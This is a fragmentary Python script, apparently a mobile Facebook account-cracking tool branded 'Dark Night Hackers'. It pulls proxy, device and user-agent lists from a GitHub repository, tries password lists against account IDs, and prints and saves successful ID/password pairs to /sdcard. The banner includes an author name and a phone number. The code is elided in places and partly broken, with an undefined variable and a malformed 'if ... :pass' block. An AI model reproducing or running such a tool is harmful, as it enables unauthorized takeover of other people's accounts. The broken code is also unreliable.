...
try:
	prox= requests.get('https://github.com/DnhTeam/data/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://github.com/DnhTeam/data/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	jf=requests.get('https://github.com/DnhTeam/data/main/ua.txt').text.splitlines()
	for us in jf:
		usr.append(us)
except: pass
...
\033[1;31m------------------------------------------------
\033[1;32m》AUTHOR    : PARWIZ
》FACEBOOK  : PARWIZ AFGHAN 
》GITHUB    : PARWIZ AFGHAN 
》WHATSAPP  : +93790510608
》TAEM      : DARK NIGHT HACKERS
\033[1;31m------------------------------------------------
"""                                  
\33[37;41m\t WELLCOME TO PARWIZ AFGHAN TOOLS\33[0;m
...
Pafghan1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
Pafghan = random.choice(FJoya1)
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m PARWIZ ➥AFGHAN]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [D_N_H==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [D_N_H==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/F-JOYA-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
